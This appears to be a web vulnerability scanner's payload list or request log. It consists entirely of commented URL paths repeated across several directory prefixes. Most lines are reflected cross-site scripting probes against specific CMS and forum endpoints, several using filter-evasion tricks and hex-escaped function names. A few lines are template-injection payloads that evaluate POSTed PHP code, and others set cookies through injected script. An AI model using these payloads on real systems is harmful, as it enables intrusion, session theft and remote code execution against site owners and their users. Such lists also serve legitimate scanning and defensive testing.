# /0_5/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_5/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /0_5/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /0_5/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /0_5/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /0_5/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /0_5/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0_5/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /0/admin/receive.php?signMsg=0FEBF34C4A2EBF825F60025D6C0576F2&version=%3Cobject%20data=...%3E
#
# /0/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /0/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /0/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /0/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /0/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /0/api.php?op=video_api&pc_hash=test%22/%3Ec%3Cscscriptript%3Ealert(42873)%3C/scscriptript%3E&&do_complete=1&uid=1&snid=1
#
# /0/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /0/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /0/cgi/index.cgi?error=badlogin&__mode=show_login%27%22%28%29%26%25%3CScRiPt%20%3Ealert%2842873%29%3C%2fScRiPt%3E
#
# /0/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /0/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /0/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/forgetbf.asp?errstr=--%3E%3C/script%3E%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0/?gallery-1--1--'%20%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20'--grid.html
#
# /0/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /0/index.php?a=lists&agent=2%20onmoonmouseoveruseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /0/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%20onmonmouseoverouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%22%20onmouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%20onmoonmouseoveruseover=alert(42873)%20y=&zone=3363
#
# /0/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%22%20onmouseover=alert(42873)%20y=&zone=3363
#
# /0/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
#
# /0/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /0/index.php?m=yp&c=index&a=lists&areaid=12&catid=114&price=&tid=1%22%20onmouseover=prompt(42873)%20&page=1&order=1
#
# /0/index.php?m=yp&c=index&a=lists&areaid=37%20%20onmouseover%3Dprompt%2842873%29%20&catid=10&price=1_500&page=1&order=4
#
# /0/index.php?m=yp&c=index&a=lists&areaid=37&catid=10&price=%22%20onmouseover=prompt(42873)%20&page=1&order=4
#
# /0/index.php?product-%22%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20-1122-viewpic.html
#
# /0/manage/Zone/TemplateList.aspx?OpenerText=a');%7Dalert(42873);%7B//
#
# /0/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /0/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /0/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /0/?product-75-1@%7C1122%22%3E%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%20-index.html
#
# /0/radcontrols/editor/dialog.aspx?dialog=ImageManager&editorID=');%3C/script%3E%3CScRiPt/acu%20src=1%20onerror=alert(42873)%3E%3C/ScRiPt%3E%3Cscript%3E//&language=zh_CN&sessionID2=8ca6abaf-d361-328c-9178-%20f78311cd0329&UseEmbeddedScripts=yes&useSession=0
#
# /0/report/reportServlet?action=4&url=http://127.0.0.1&file=wait_trace.raq&columns=0&srcType=file&width=-1&height=-1&cachedId=A_2&t_i_m_e=&frame=stu_saveAs_frame--%3E%3C/sCrIpT%3E%3CsCrIpT%3Ealert(42873)%3C/sCrIpT%3E
#
# /0/resume/?key=xxxx%bf%22;alert(360);//
#
# /0/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /0/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /0/styles/outlook1/tools/calendar/calEditEvent.php?action=edit%22%3E%3Cscript%3Ealert(42873)%3C/script%3Ebad=%22&calid=
#
# /0/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /0/system/nhome/login.jsp?message=%22)--%3E%3C/script%3E%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /0/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /0/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /10191/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /10191/admin/receive.php?signMsg=0FEBF34C4A2EBF825F60025D6C0576F2&version=%3Cobject%20data=...%3E
#
# /10191/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /10191/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /10191/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /10191/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /10191/api.php?op=video_api&pc_hash=1&uid=1&snid=1122%22%20onmouseover=alert(42873)//&do_complete=1
#
# /10191/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /10191/api.php?op=video_api&pc_hash=test%22/%3Ec%3Cscscriptript%3Ealert(42873)%3C/scscriptript%3E&&do_complete=1&uid=1&snid=1
#
# /10191/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /10191/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /10191/cgi/index.cgi?error=badlogin&__mode=show_login%27%22%28%29%26%25%3CScRiPt%20%3Ealert%2842873%29%3C%2fScRiPt%3E
#
# /10191/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /10191/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /10191/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /10191/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /10191/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /10191/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /10191/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /10191/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /10191/?gallery-1--1--'%20%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20'--grid.html
#
# /10191/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /10191/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /10191/index.php?a=lists&agent=2%20onmoonmouseoveruseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /10191/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%20onmonmouseoverouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%22%20onmouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%20onmoonmouseoveruseover=alert(42873)%20y=&zone=3363
#
# /10191/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%22%20onmouseover=alert(42873)%20y=&zone=3363
#
# /10191/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
#
# /10191/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /10191/index.php?m=yp&c=index&a=lists&areaid=12&catid=114&price=&tid=1%22%20onmouseover=prompt(42873)%20&page=1&order=1
#
# /10191/index.php?m=yp&c=index&a=lists&areaid=37%20%20onmouseover%3Dprompt%2842873%29%20&catid=10&price=1_500&page=1&order=4
#
# /10191/index.php?m=yp&c=index&a=lists&areaid=37&catid=10&price=%22%20onmouseover=prompt(42873)%20&page=1&order=4
#
# /10191/index.php?product-%22%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20-1122-viewpic.html
#
# /10191/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /10191/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /10191/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /10191/?product-75-1@%7C1122%22%3E%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%20-index.html
#
# /10191/resume/?key=xxxx%bf%22;alert(360);//
#
# /10191/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /10191/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /10191/styles/outlook1/tools/calendar/calEditEvent.php?action=edit%22%3E%3Cscript%3Ealert(42873)%3C/script%3Ebad=%22&calid=
#
# /10191/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /10191/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /10191/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /10191/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /10191/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /?10256=javascript:alert(1)
#
# /?10258=alert(1)
#
# /?1=%0Aalert(1);
#
# /?1=%0D%0A%0D%0A%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?1=123%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /114/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /114/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /114/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /114/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /114/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /114/post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=,prompt(42873)
#
# /114/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /114/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /114/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /114/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /?1=%20onchange=alert(1)
#
# /?1='%20onchange=alert(1)%20a'
#
# /?1=%22%20onchange=alert(1)%20a%22
#
# /?1=%22'%3E%3Cbody%20id=ssltest%20title=alert(1)%20onload=eval(ssltest.title)%3E
#
# /?1=%22%3E%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?1=%22%3E%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?1='%22;alert(1);//
#
# /?1=%22;alert(1);//
#
# /?1=%22);alert(1);//
#
# /?1=%22;alert(1);%22
#
# /12315wsts//oa/?s=/abc/abc/abc/${@print(eval($_POST[c]))}/
#
# /12315wsts//?s=/abc/abc/abc/$%7B@print(eval($_POST[1]))%7D
#
# /12315wsts//?s=/abc/abc/abc/$%7B@print(eval($_POST[c]))%7D
#
# /1300qfuu.asp?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.aspx?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.cfc?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.cfm?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.cgi?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.dll?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.do?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.exe?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.fts?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.html?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.htm?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.idc?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.jspa?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.jsp?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.kspx?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.mscgi?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.nsf?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.php3?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.php?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.pl?<script>document.cookie=%22testopai=8020;%22</script>
#
# /1300qfuu.x?<script>document.cookie=%22testopai=8020;%22</script>
#
# /?1=%3Cimg%20src=1%20onerror=alert(1)%3E
#
# /?1=%3Cscrip%3Cscript%3Et%3Ewindow.a==1?1:alert(1)%3C/scrip%3C/script%3Et%3E
#
# /?1=%3C/script%3E%3Cscript%3Ealert(1);//
#
# /?1=%3Cscript%3Econfirm(1)%3C/script%3E
#
# /?1=%3Cscript/defer%3Ealert(1)%3C/script%3E
#
# /?1=%3C/textarea%3E%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?1='%3E%22%3E%3C/title%3E%3C/textarea%3E%3C/script%3E%3Cimg+src=a+onerror=alert(1)%3E
#
# /?1=--%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?1=%3E'%3E%22%3E%3Cscript%3Ealert(1)%3C/script%3E
#
# /?1='%3E%5C';%3C/script%3E%3E%5C%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
#
# /144/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /144/admin/receive.php?signMsg=0FEBF34C4A2EBF825F60025D6C0576F2&version=%3Cobject%20data=...%3E
#
# /144/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /144/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /144/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /144/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /144/api.php?op=video_api&pc_hash=1&uid=1&snid=1122%22%20onmouseover=alert(42873)//&do_complete=1
#
# /144/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /144/api.php?op=video_api&pc_hash=test%22/%3Ec%3Cscscriptript%3Ealert(42873)%3C/scscriptript%3E&&do_complete=1&uid=1&snid=1
#
# /144/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /144/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /144/cgi/index.cgi?error=badlogin&__mode=show_login%27%22%28%29%26%25%3CScRiPt%20%3Ealert%2842873%29%3C%2fScRiPt%3E
#
# /144/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /144/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /144/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /144/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /144/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /144/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /144/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /144/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /144/?gallery-1--1--'%20%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20'--grid.html
#
# /144/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /144/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /144/index.php?a=lists&agent=2%20onmoonmouseoveruseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /144/index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
